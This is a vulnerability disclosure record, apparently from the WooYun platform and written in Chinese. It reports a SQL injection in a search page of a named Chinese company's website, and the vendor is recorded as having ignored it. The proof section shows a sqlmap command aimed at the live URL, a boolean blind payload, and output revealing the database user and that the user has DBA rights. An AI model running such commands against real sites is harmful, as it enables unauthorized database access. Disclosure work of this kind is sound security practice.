wybug_title: 盘古网络官方网站某站点SQL注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-09-08：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-10-23：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 盘古网络官方网站某站点SQL注入 详细说明：  POST注入：http://dz.pangu.us/search_case.php  post：id=32



   漏洞证明：  
D:\sqlmap>python sqlmap.py -u http://dz.pangu.us/search_case.php? --data id=32 --is-dba -v 1         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150806}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:40:32[14:40:32] [INFO] resuming back-end DBMS 'mysql'[14:40:34] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: id (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=32 AND 8587=8587---[14:40:35] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.3.3, Nginxback-end DBMS: MySQL 5[14:40:35] [INFO] testing if current user is DBA[14:40:35] [INFO] fetching current user[14:40:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[14:40:35] [INFO] retrieved:[14:40:36] [WARNING] reflective value(s) found and filtering outnic312662@localhostcurrent user is DBA:    True[14:42:20] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\dz.pangu.us'[*] shutting down at 14:42:20
   修复方案：     版权声明：转载请注明来源 泳少@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
